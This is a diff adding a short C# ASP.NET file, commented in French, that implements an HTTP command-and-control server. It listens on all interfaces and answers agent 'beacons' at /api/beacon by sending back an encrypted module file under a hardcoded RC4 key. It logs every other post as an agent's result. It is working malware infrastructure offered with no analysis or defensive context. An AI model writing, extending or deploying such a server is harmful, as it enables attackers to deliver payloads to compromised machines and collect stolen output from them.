@@ -1,0 +1,35 @@
+// HTTP C2 Server (minimal API style)
+// Reçoit les beacons et envoie un module chiffré en réponse
+
+using System;
+using System.IO;
+using System.Text;
+using Microsoft.AspNetCore.Builder;
+using Microsoft.AspNetCore.Hosting;
+using Microsoft.AspNetCore.Http;
+using Microsoft.Extensions.Hosting;
+
+var builder = WebApplication.CreateBuilder();
+var app = builder.Build();
+
+string rc4Key = "MySecretKey123";
+string modulePath = "module.enc";
+
+app.MapPost("/api/beacon", async (HttpContext ctx) =>
+{
+    using var reader = new StreamReader(ctx.Request.Body);
+    string beacon = await reader.ReadToEndAsync();
+
+    if (beacon.StartsWith("BEACON"))
+    {
+        byte[] module = File.ReadAllBytes(modulePath);
+        await ctx.Response.Body.WriteAsync(module, 0, module.Length);
+    }
+    else
+    {
+        Console.WriteLine("[+] Résultat agent: " + beacon);
+        ctx.Response.StatusCode = 200;
+    }
+});
+
+app.Run("http://0.0.0.0:5000");
